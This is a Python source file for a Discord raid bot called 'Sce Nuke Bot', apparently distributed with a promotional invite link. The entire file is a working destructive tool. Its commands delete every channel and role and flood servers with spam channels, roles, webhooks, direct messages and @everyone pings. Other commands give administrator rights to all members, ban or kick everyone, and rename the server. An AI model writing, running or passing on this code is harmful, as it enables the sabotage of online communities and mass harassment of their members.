import discord
from discord.ext import commands, tasks
from colorama import Fore, Style
import asyncio
import random
import time
import os

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

intents = discord.Intents.all()
intents.members = True

prefix = input("Enter command prefix: ")
bot_name = "Sce Nuke Bot"
title = "[Sce Nuke Bot Raid V2] by Sca Team"
discord_invite = "discord.gg/J5cdNAemp"
status_msg = "Shop2sca join today (discord.gg/J5cdNAemp)"
server_name = input("Enter server name: ")
nickname = input("enter a nickname :")
dm_message = input("enter a dm message :")
icon_url = "https://cdn.discordapp.com/avatars/1242188826877890620/665296b9eac933c22043c42bf46981fb?size=256.png"

bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None)

options = [
    "Nuke",
    "Spam-role",
    "Spam-webhooks",
    "Spam-dm",
    "Spam",
    "Spam-channel",
    "Spamping",
    "Spamvc",
    "delete-role",
    "delete-channel",
    "delete-webhooks",
    "Renameall",
    "Adminall",
    "Banall",
    "Kickall",
    "Raidinfo",
    "Clearraid"
]

status = [status_msg]
anti_join_enabled = False

OWNER_ID = int(input("Enter owner ID: "))
TOKEN = input("Enter bot token: ")
channel_names = input("Enter channel names (comma separated): ").split(',')
message_options = input("Enter spam messages (comma separated): ").split(',')
admin_role_name = input("Enter admin role name: ")

def print_menu():
    print(f"{Fore.RED}{title}{Style.RESET_ALL}\n")
    for i, option in enumerate(options, start=1):
        print(f"{Fore.BLUE}[{i}] - {Style.RESET_ALL}{option}")
    print(f"\n{Fore.BLUE}[0] - {Style.RESET_ALL}{Fore.WHITE}{discord_invite}{Style.RESET_ALL}")

loading_message = "\033[92mConnecting...\033[0m"
print(loading_message, end='', flush=True)
time.sleep(1.8)
print("\r\033[92mConnected successfully!\033[0m", end='', flush=True)
time.sleep(1)
print("\r" + " " * len(loading_message))
print_menu()

@tasks.loop(seconds=6)
async def change_presence():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.streaming, name=random.choice(status), url="https://www.twitch.tv/v"))

@bot.event
async def on_ready():
    change_presence.start()
    print(f"{bot_name} is ready")

@bot.event
async def on_member_join(member):
    global anti_join_enabled
    if anti_join_enabled:
        if member.bot:
            if member.guild.me.guild_permissions.kick_members:
                await member.kick(reason="Anti-join: Bots are not allowed.")
                print(f"\033[93mBot {member.name} kicked for attempting to join.\033[0m")
            else:
                print("\033[91m[Error]\033[0m Missing permissions to kick bots.")
        else:
            await member.kick(reason="Anti-join: New members are not allowed.")
            print(f"\033[93mMember {member.name} kicked for attempting to join.\033[0m")

def is_owner():
    async def predicate(ctx):
        return ctx.author.id == OWNER_ID
    return commands.check(predicate)

@bot.command(name='spamchannel')
@is_owner()
async def spamchannel(ctx):
    print(f"Command spamchannel executed by {ctx.author.name}")
    for _ in range(999):
        try:
            new_channel = await ctx.guild.create_text_channel(random.choice(channel_names))
            await asyncio.gather(*[new_channel.send(random.choice(message_options)) for _ in range(50)])
            print(f"\033[92mChannel {new_channel.name} created and spammed successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError creating/spamming channel: {e}\033[0m")

@bot.command(name='spamping')
@is_owner()
async def spam_ping(ctx, *, message):
    print(f"Command spamping executed by {ctx.author.name}")
    for channel in ctx.guild.text_channels:
        try:
            await channel.send(f"@everyone {message}")
            print(f"\033[92mMessage sent in {channel.name} successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError sending message in {channel.name}: {e}\033[0m")

@bot.command(name='spamvc')
@is_owner()
async def spam_vc(ctx):
    print(f"Command spamvc executed by {ctx.author.name}")
    for i in range(150):
        try:
            vc_name = f"vc-{random.randint(1000,9999)}"
            await ctx.guild.create_voice_channel(vc_name)
            print(f"\033[92mVoice channel {vc_name} created successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError creating voice channel: {e}\033[0m")

@bot.command(name='raid')
@is_owner()
async def raid(ctx):
    print(f"Command 'raid' executed by: {ctx.author.name}.")
    
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"\033[92mChannel {channel.name} deleted.\033[0m")
        except Exception as e:
            print(f"\033[91mError deleting channel {channel.name}: {e}\033[0m")
    
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"\033[92mRole {role.name} deleted successfully.\033[0m")
            except Exception as e:
                print(f"\033[91mError deleting role {role.name}: {e}\033[0m")
    
    for _ in range(100):
        try:
            await ctx.guild.create_role(name=random.choice(message_options))
            print(f"\033[92mRole created successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError creating role: {e}\033[0m")
    
    admin_role = discord.utils.get(ctx.guild.roles, name=admin_role_name)
    if admin_role is None:
        try:
            admin_role = await ctx.guild.create_role(name=admin_role_name, permissions=discord.Permissions(administrator=True))
            print(f"Role {admin_role_name} created.")
        except Exception as e:
            print(f"Error creating role {admin_role_name}: {e}")
    
    for member in ctx.guild.members:
        try:
            await member.edit(nick=nickname)
            print(f"\033[92mMember {member.name} renamed successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError renaming member {member.name}: {e}\033[0m")
        
        try:
            if admin_role not in member.roles:
                await member.add_roles(admin_role)
                print(f"Role {admin_role_name} added to {member.name}.")
        except Exception as e:
            print(f"Error adding role {admin_role_name} to {member.name}: {e}")
    
    async def create_channel_and_spam(channel_name):
        new_channel = await ctx.guild.create_text_channel(channel_name)
        await asyncio.gather(*[new_channel.send(random.choice(message_options)) for _ in range(50)])
        await asyncio.sleep(1)
    
    tasks = [create_channel_and_spam(f'{random.choice(channel_names)}-{i}') for i in range(100)]
    await asyncio.gather(*tasks)
    
    for channel in ctx.guild.channels:
        try:
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                await webhook.delete()
                print(f"\033[92mWebhook {webhook.name} deleted successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError deleting webhook: {e}\033[0m")
    
    for _ in range(100):
        for channel in ctx.guild.channels:
            try:
                await channel.create_webhook(name=random.choice(message_options))
                print(f"\033[92mWebhook created in {channel.name} successfully.\033[0m")
            except Exception as e:
                print(f"\033[91mError creating webhook in {channel.name}: {e}\033[0m")
    
    for member in ctx.guild.members:
        try:
            await member.send(dm_message)
            print(f"\033[92mMessage sent to {member.name} successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError sending message to {member.name}: {e}\033[0m")
    
    try:
        await ctx.guild.edit(name=server_name)
        print("\033[92mServer name changed.\033[0m")
    except Exception as e:
        print(f"\033[91mError changing server name: {e}\033[0m")
    
    try:
        async with bot.session.get(icon_url) as resp:
            if resp.status == 200:
                await ctx.guild.edit(icon=await resp.read())
        print("\033[92mServer icon changed.\033[0m")
    except Exception as e:
        print(f"\033[91mError changing server icon: {e}\033[0m")
    
    await ctx.send("Raid completed successfully!")

@bot.command(name='nuke')
@is_owner()
async def nuke(ctx):
    print("\033[91mStarting nuke...\033[0m")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"\033[92mChannel {channel.name} deleted.\033[0m")
        except Exception as e:
            print(f"\033[91mError deleting channel {channel.name}: {e}\033[0m")
    print("\033[92mAll channels deleted.\033[0m")
    
    async def create_channel_and_spam(channel_name):
        new_channel = await ctx.guild.create_text_channel(channel_name)
        await asyncio.gather(*[new_channel.send(random.choice(message_options)) for _ in range(50)])
        await asyncio.sleep(1)
    
    tasks = [create_channel_and_spam(f'{random.choice(channel_names)}-{i}') for i in range(100)]
    await asyncio.gather(*tasks)
    print("\033[92mNew channels created and messages sent.\033[0m")
    
    try:
        await ctx.guild.edit(name=server_name)
        print("\033[92mServer name changed.\033[0m")
    except Exception as e:
        print(f"\033[91mError changing server name: {e}\033[0m")
    
    try:
        async with bot.session.get(icon_url) as resp:
            if resp.status == 200:
                await ctx.guild.edit(icon=await resp.read())
        print("\033[92mServer icon changed.\033[0m")
    except Exception as e:
        print(f"\033[91mError changing server icon: {e}\033[0m")

@bot.command(name='adminall')
@is_owner()
async def adminall(ctx):
    admin_role = discord.utils.get(ctx.guild.roles, name=admin_role_name)
    if admin_role is None:
        try:
            admin_role = await ctx.guild.create_role(name=admin_role_name, permissions=discord.Permissions(administrator=True))
            print(f"Role {admin_role_name} created.")
        except Exception as e:
            await ctx.send(f"Error creating role {admin_role_name}: {e}")
            return
    
    for member in ctx.guild.members:
        try:
            if admin_role not in member.roles:
                await member.add_roles(admin_role)
                print(f"Role {admin_role_name} added to {member.name}.")
        except Exception as e:
            print(f"Error adding role {admin_role_name} to {member.name}: {e}")
    await ctx.send(f"Role {admin_role_name} added to all members.")

@bot.command(name='banall')
@is_owner()
async def banall(ctx):
    print(f"Command banall executed by {ctx.author.name}")
    for member in ctx.guild.members:
        if member.id != OWNER_ID:
            try:
                await member.ban(reason="Banned due to raid association.")
                print(f"\033[92mMember {member.name} banned successfully.\033[0m")
            except Exception as e:
                print(f"\033[91mError banning member {member.name}: {e}\033[0m")

@bot.command(name='kickall')
@is_owner()
async def kickall(ctx):
    print(f"Command kickall executed by {ctx.author.name}")
    for member in ctx.guild.members:
        if member.id != OWNER_ID:
            try:
                await member.kick(reason="Kicked due to raid association.")
                print(f"\033[92mMember {member.name} kicked successfully.\033[0m")
            except Exception as e:
                print(f"\033[91mError kicking member {member.name}: {e}\033[0m")

@bot.command(name='renameall')
@is_owner()
async def renameall(ctx, *, name):
    print(f"Command renameall executed by {ctx.author.name}")
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
            print(f"\033[92mMember {member.name} renamed successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError renaming member {member.name}: {e}\033[0m")

@bot.command(name='delete-webhooks')
@is_owner()
async def delete_webhooks(ctx):
    print(f"Command delete-webhooks executed by {ctx.author.name}")
    for channel in ctx.guild.channels:
        try:
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                await webhook.delete()
                print(f"\033[92mWebhook {webhook.name} deleted successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError deleting webhook: {e}\033[0m")

@bot.command(name='delete-channel')
@is_owner()
async def delete_channels(ctx):
    print(f"Command delete-channel executed by {ctx.author.name}")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"\033[92mChannel {channel.name} deleted successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError deleting channel {channel.name}: {e}\033[0m")

@bot.command(name='delete-role')
@is_owner()
async def delete_roles(ctx):
    print(f"Command delete-role executed by {ctx.author.name}")
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"\033[92mRole {role.name} deleted successfully.\033[0m")
            except Exception as e:
                print(f"\033[91mError deleting role {role.name}: {e}\033[0m")

@bot.command(name='spam-role')
@is_owner()
async def spam_roles(ctx):
    print(f"Command spam-role executed by {ctx.author.name}")
    for _ in range(100):
        try:
            await ctx.guild.create_role(name=random.choice(message_options))
            print(f"\033[92mRole created successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError creating role: {e}\033[0m")

@bot.command(name='spam-webhooks')
@is_owner()
async def spam_webhooks(ctx):
    print(f"Command spam-webhooks executed by {ctx.author.name}")
    for _ in range(100):
        for channel in ctx.guild.channels:
            try:
                await channel.create_webhook(name=random.choice(message_options))
                print(f"\033[92mWebhook created in {channel.name} successfully.\033[0m")
            except Exception as e:
                print(f"\033[91mError creating webhook in {channel.name}: {e}\033[0m")

@bot.command(name='spamdm')
@is_owner()
async def spam_dm(ctx, *, message):
    print(f"Command spamdm executed by {ctx.author.name}")
    if not message:
        await ctx.send("You must specify a message.")
        return
    for member in ctx.guild.members:
        try:
            await member.send(message)
            print(f"\033[92mMessage sent to {member.name} successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError sending message to {member.name}: {e}\033[0m")

@bot.command(name='anti-join')
@is_owner()
async def toggle_anti_join(ctx):
    global anti_join_enabled
    anti_join_enabled = not anti_join_enabled
    print(f"Anti-join {'enabled' if anti_join_enabled else 'disabled'} by {ctx.author.name}")

@bot.command(name='help')
async def help(ctx):
    embed = discord.Embed(title="Sce Nuke Tool - Help", description="Available commands:", color=0x00ff00)
    embed.add_field(name=".raid", value="mixture of all cmd", inline=False)
    embed.add_field(name=".nuke", value="Delete all channels and spam new ones.", inline=False)
    embed.add_field(name=".adminall", value="Give admin role to all members.", inline=False)
    embed.add_field(name=".banall", value="Ban all members except the owner.", inline=False)
    embed.add_field(name=".kickall", value="Kick all members except the owner.", inline=False)
    embed.add_field(name=".renameall [name]", value="Rename all members.", inline=False)
    embed.add_field(name=".delete-webhooks", value="Delete all webhooks.", inline=False)
    embed.add_field(name=".delete-channel", value="Delete all channels.", inline=False)
    embed.add_field(name=".delete-role", value="Delete all roles except default.", inline=False)
    embed.add_field(name=".spam-role", value="Spam roles with random names.", inline=False)
    embed.add_field(name=".spam-webhooks", value="Spam webhooks in all channels.", inline=False)
    embed.add_field(name=".spamdm [message]", value="Send direct messages to all members.", inline=False)
    embed.add_field(name=".spamchannel", value="Spam channels with random names and messages.", inline=False)
    embed.add_field(name=".spamping [message]", value="Spam @everyone in all channels.", inline=False)
    embed.add_field(name=".spamvc", value="Create 150 random voice channels.", inline=False)
    embed.add_field(name=".anti-join", value="Toggle anti-join mode.", inline=False)
    embed.add_field(name=".help", value="Show this help.", inline=False)
    await ctx.send(embed=embed)

bot.run(TOKEN)